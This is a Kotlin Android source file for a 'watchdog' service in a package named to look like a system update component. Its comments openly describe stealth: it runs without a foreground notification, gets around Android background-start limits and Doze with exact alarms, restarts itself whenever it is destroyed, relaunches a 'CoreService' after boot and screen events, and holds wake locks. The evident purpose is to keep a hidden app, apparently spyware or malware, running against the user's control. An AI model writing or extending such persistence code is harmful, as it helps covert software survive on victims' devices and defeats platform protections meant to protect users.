package com.androidsystem.update.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import java.util.concurrent.Executors

class WatchdogService : Service() {

    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var isRunning = false
    private var wakeLock: PowerManager.WakeLock? = null

    companion object {
        private const val TAG = "Watchdog"
        const val CHECK_INTERVAL = 60000L
        private const val WATCHDOG_PREFS = "watchdog_prefs"
        const val HEARTBEAT_KEY = "last_heartbeat"
        const val TIMEOUT_MS = 90000L
        const val CHANNEL_ID = "watchdog_ch"
        const val NOTIFICATION_ID = 102

        fun start(context: Context) {
            // Stealth: plain background service — no foreground notification.
            // Direct startService is blocked when the app is backgrounded on
            // Android 8+; an exact alarm with a service PendingIntent carries
            // the background-start exemption, so fall back to it.
            try {
                context.startService(Intent(context, WatchdogService::class.java))
            } catch (e: Exception) {
                Log.d(TAG, "Direct start blocked, scheduling via alarm")
                scheduleAlarmStart(context, WatchdogService::class.java, 1000L)
            }
        }

        // Exact alarm whose PendingIntent starts [cls] — exempt from the
        // background-service-start restriction. Falls back to an inexact alarm
        // when SCHEDULE_EXACT_ALARM is missing (Android 14+ default).
        fun scheduleAlarmStart(context: Context, cls: Class<*>, delayMs: Long) {
            AlarmScheduler.scheduleServiceStart(context, cls, cls.hashCode(), delayMs)
        }
    }

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> checkCoreService()
                Intent.ACTION_SCREEN_OFF -> executor.schedule({ checkCoreService() }, 30, java.util.concurrent.TimeUnit.SECONDS)
            }
        }
    }

    private val bootReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
                intent.action == Intent.ACTION_LOCKED_BOOT_COMPLETED) {
                Log.d(TAG, "Boot detected")
                startCoreService()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Watchdog created")
        registerReceiver(screenReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        })
        registerReceiver(bootReceiver, IntentFilter().apply {
            addAction(Intent.ACTION_BOOT_COMPLETED)
            addAction(Intent.ACTION_LOCKED_BOOT_COMPLETED)
        })
        startPeriodicCheck()
        scheduleAlarm()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        checkCoreService()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        executor.shutdownNow()
        try {
            unregisterReceiver(screenReceiver)
            unregisterReceiver(bootReceiver)
        } catch (e: Exception) { /* ignore */ }
        wakeLock?.let { if (it.isHeld) it.release() }
        scheduleRestart()
    }

    private fun scheduleRestart(delayMs: Long = 5000L) {
        AlarmScheduler.scheduleServiceStart(this, WatchdogService::class.java, 0, delayMs)
    }

    private fun startPeriodicCheck() {
        isRunning = true
        executor.scheduleAtFixedRate(
            { if (isRunning) checkCoreService() },
            0, CHECK_INTERVAL, java.util.concurrent.TimeUnit.MILLISECONDS
        )
    }

    private fun checkCoreService() {
        if (!isServiceRunning()) {
            Log.d(TAG, "CoreService not running, restarting")
            startCoreService()
        }
    }

    private fun startCoreService() {
        try {
            startService(Intent(this, CoreService::class.java))
        } catch (e: Exception) {
            Log.d(TAG, "startCoreService blocked, scheduling via alarm")
            scheduleAlarmStart(this, CoreService::class.java, 1000L)
        }
    }

    // FIX: grace period — last == 0 means first boot, return true
    private fun isServiceRunning(): Boolean {
        val prefs = getSharedPreferences(WATCHDOG_PREFS, Context.MODE_PRIVATE)
        val last = prefs.getLong(HEARTBEAT_KEY, 0)
        if (last == 0L) return true // grace period on first boot
        return System.currentTimeMillis() - last < TIMEOUT_MS
    }

    // Exact self-re-arming alarm instead of setRepeating: OEMs (especially
    // Samsung) batch and defer repeating alarms aggressively, which is exactly
    // how the app ends up dead until the user reopens it. An exact
    // allow-while-idle alarm fires even in Doze (unless the OEM puts the app
    // in deep sleep), and WatchdogAlarmReceiver re-arms the next one.
    private fun scheduleAlarm() {
        val alarmIntent = PendingIntent.getBroadcast(
            this, 0, Intent(this, WatchdogAlarmReceiver::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val am = getSystemService(ALARM_SERVICE) as AlarmManager
        val triggerAt = System.currentTimeMillis() + 300000L
        try {
            if (AlarmScheduler.canScheduleExact(this)) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, alarmIntent)
            } else {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, alarmIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exact alarm failed, falling back", e)
            try {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, alarmIntent)
            } catch (e2: Exception) {
                Log.e(TAG, "Fallback alarm failed too", e2)
            }
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Watchdog:WakeLock")
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock acquire failed", e)
        }
    }

    class WatchdogAlarmReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            Log.d(TAG, "Alarm triggered")
            start(context)
        }
    }
}
